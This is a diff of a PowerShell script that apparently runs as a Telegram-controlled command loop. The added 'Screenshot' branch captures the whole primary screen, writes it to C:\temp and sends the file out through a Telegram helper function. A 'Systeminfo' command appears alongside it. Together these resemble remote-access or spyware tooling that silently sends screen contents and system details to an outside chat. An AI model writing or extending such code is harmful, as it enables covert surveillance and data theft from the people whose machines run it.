@@ -176,7 +176,22 @@ while ($true) {
                 }
 
                 "Screenshot" {
-                    Send-TelegramMessage -chatId $chatId -text "You selected Option 2"
+                    # Capture a screenshot
+                    Add-Type -AssemblyName System.Windows.Forms
+                    Add-Type -AssemblyName System.Drawing
+
+                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $bitmap = New-Object System.Drawing.Bitmap $screen.width, $screen.height
+                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+                    if (-not(Test-Path -Path c:\temp)) {
+                        New-Item -Path c:\temp -ItemType Directory -Force | Out-Null
+                    }
+                    # Save the screenshot to a file
+                    $screenshotFile = "C:\temp\screenshot.png"
+                    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
+
+                    Download-TelegramFiles -filePath "C:\temp\screenshot.png"
                 }
 
                 "Systeminfo" {
